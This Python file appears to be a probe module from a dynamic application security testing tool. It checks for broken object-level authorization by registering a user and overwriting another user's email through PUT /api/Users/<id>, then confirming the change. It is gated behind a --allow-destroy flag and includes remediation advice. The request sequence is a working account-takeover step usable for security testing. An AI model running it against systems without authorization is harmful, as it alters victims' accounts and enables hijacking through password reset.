#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization (BOLA): caller can change another user's email.

`PUT /api/Users/<id>` should be admin-only OR scoped to the caller's
own id. When neither check is in place, an authenticated caller can
hijack any other account by overwriting the email — the next
password-reset flow then sends the reset link to the attacker.

Detection signal:
  Register and log in as user A. PUT /api/Users/<other_id> with
  `{"email": <attacker-controlled-marker>}`. GET the same id and
  confirm the email was rewritten.

Destructive — we mutate another user's record. Off by default; use a
sentinel email so the operator can revert. Off in CI.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

USERS_PATH = "/api/Users/{id}"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"email-change-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None,
                 "user_id": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class UserEmailChangeOtherProbe(Probe):
    name = "authz_user_email_change_other"
    summary = ("Detects PUT /api/Users/<other_id> rewriting another "
               "user's email — account-hijack precondition.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--victim-uid", type=int, default=1,
            help="UserId to attempt to mutate (default 1).")
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — probe mutates another user's email.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: probe rewrites another user's "
                         "email. Re-run with --allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        own   = sess.get("user_id")
        victim = int(args.victim_uid)
        if own is not None and own == victim:
            victim = victim + 1
        marker = f"hijacked-{secrets.token_hex(4)}@dast.test"

        url = urljoin(origin, USERS_PATH.format(id=victim))
        r = client.request("PUT", url, headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }, body=json.dumps({"email": marker}).encode())
        write = {"step": "put-other", "status": r.status, "size": r.size,
                 "body_excerpt": (r.text or "")[:200]}

        # Verify via GET. If the controller returns the mutated record
        # in the PUT response, we save a request — but verify-on-read
        # is more robust because some servers ack the write before
        # rolling back on a constraint violation.
        r2 = client.request("GET", url, headers={
            "Authorization": f"Bearer {token}",
        })
        read = {"step": "verify-get", "status": r2.status, "size": r2.size,
                "body_excerpt": (r2.text or "")[:200]}
        confirmed = False
        if r2.status == 200 and r2.body and marker in r2.text:
            confirmed = True
            read["marker_persisted"] = True

        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "victim_uid": victim, "marker": marker,
                    "attempts": [write, read]}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: PUT {url} rewrote the victim's "
                         f"email to {marker!r}. Account-hijack "
                         "precondition is in place."),
                evidence=evidence,
                severity_uplift="critical",
                remediation=(
                    "Refuse PUT /api/Users/<id> when "
                    "`req.user.id != id` AND the caller is not an "
                    "admin. Email change is one of the highest-impact "
                    "fields on a user record — guard it explicitly, "
                    "and require email confirmation (a token round-"
                    "trip to the OLD address) before persisting."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: PUT {url} did not persist a foreign "
                     "email change."),
            evidence=evidence,
        )


if __name__ == "__main__":
    UserEmailChangeOtherProbe().main()
